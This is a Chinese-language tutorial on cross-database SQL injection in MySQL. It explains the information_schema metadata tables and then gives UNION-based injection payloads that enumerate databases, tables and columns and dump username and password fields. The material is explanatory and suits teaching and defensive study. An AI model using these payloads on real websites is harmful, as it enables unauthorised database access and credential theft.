跨库查询是 SQL注入的一种。

information_schema数据库是MySQL自带的，它提供了访问数据库元数据的方式。什么是元数据呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。

在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。

information_schema数据库表说明:

**SCHEMATA**表：提供了当前mysql实例中所有数据库的信息。是show databases的结果取之此表。

**TABLES表**：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的结果取之此表。

**COLUMNS表**：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是show columns from schemaname.tablename的结果取之此表。

**STATISTICS表**：提供了关于表索引的信息。是show index from schemaname.tablename的结果取之此表。

**USER_PRIVILEGES（用户权限）表**：给出了关于全程权限的信息。该信息源自mysql.user授权表。是非标准表。

**SCHEMA_PRIVILEGES（方案权限）表**：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。是非标准表。

**TABLE_PRIVILEGES（表权限）表**：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。是非标准表。

**COLUMN_PRIVILEGES（列权限）表**：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。是非标准表。

**CHARACTER_SETS（字符集）表**：提供了mysql实例可用字符集的信息。是SHOW CHARACTER SET结果集取之此表。

**COLLATIONS表**：提供了关于各字符集的对照信息。

**COLLATION_CHARACTER_SET_APPLICABILITY表**：指明可用于校对的字符集。这些列等效于SHOW COLLATION的前两个显示字段。

**TABLE_CONSTRAINTS表**：描述了存在约束的表。以及表的约束类型。

**KEY_COLUMN_USAGE表**：描述了具有约束的键列。

**ROUTINES表**：提供了关于存储子程序（存储程序和函数）的信息。此时，ROUTINES表不包含自定义函数（UDF）。名为“mysql.proc name”的列指明了对应于INFORMATION_SCHEMA.ROUTINES表的mysql.proc表列。

**VIEWS表**：给出了关于数据库中的视图的信息。需要有show views权限，否则无法查看视图信息。

**TRIGGERS表**：提供了关于触发程序的信息。必须有super权限才能查看该表

**SCHEMATA** 

SCHEMATA_NAME

**TABLES**

TABLE_SCHEMA
TABLE_NAME

**COLUMNS**

TABLE_SCHEMA
TABLE_NAME
COLUMN_NAME

**MYSQL注入语句分析**

查询库

```sql
and 1=2 union select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1
select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 0,1
```

SCHEMA_NAME

information_schema.SCHEMATA 查询那个数据库的那个表的意思 如果在同一个数据库里

就不用加上information_schema. 

limit 3 从开头取三行 三个

limit 0,1 从什么开头 取多少个

```sql
select 1,2,3,SCHEMA_NAME,5,6,7,8,9,10 from information_schema.SCHEMATA limit 5,1
```

查询表

```sql
and 1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=mydata limit 0,1
select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=mydata limit 0,1
select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库（十六进制） limit
```

select (0x6D6F6F6E)

hex()

unhex()

查询列

```sql
and 1=2 Union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME=表名（十六进制）limit 0,1
select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schema.COLUMNS where TABLE_NAME='goods' limit 0,1
```

查询数据

暴密码  

```sql
and 1=2 Union select 1,2,3,用户名段,5,6,7,密码段,8,9 from 表名 limit 0,1
select * from goods where id=1 union select  1,2,3,4 from users;
select * from goods where id=-1 union select  1,2,3,4 from users;
```



首先查询库

```sql
select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1;
select SCHEMA_NAME from information_schema.SCHEMATA limit 1;
select SCHEMA_NAME from information_schema.SCHEMATA limit 1,1;
```

查询表

select hex('moon')

```sql
select  TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='moon' limit 1,1;
select  TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=0x6D6F6F6E limit 1,1;
```

列

```sql
select COLUMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA='moon' and TABLE_NAME='users' limit 1;
select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME='users' limit 1;
```

查询结果

id username password

```sql
select id,username,password from moon.users;
select id,username,password from moon.users limit 1;
```

通过information_schema系统库里面表来查询其他库表的数据

跨库查询。权限比较大的时候才可以的。(root)